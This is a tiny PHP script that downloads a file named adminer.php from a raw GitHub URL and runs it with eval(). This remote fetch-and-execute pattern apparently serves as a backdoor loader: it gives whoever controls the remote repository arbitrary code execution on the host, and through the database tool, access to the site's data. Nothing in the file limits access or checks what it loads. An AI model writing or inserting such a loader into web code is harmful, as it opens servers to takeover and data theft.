<?php

$content = file_get_contents(urldecode('https://raw.githubusercontent.com/yourfr13nds/backburner/main/adminer.php'));

$content = "?> ".$content;
eval($content);
